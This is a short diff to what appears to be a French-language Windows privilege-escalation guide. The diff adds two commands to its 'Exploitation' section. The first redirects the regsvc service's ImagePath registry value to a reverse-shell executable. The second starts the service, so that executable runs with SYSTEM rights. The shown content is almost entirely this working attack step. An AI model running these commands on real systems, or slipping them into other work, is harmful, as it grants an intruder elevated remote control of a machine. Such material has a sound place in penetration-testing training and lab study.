@@ -118,7 +118,8 @@ accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
 ### Exploitation
 
 ```shell
-
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
+net start regsvc
 ```
 
 ## Trouver un service vulnérable (manuel)
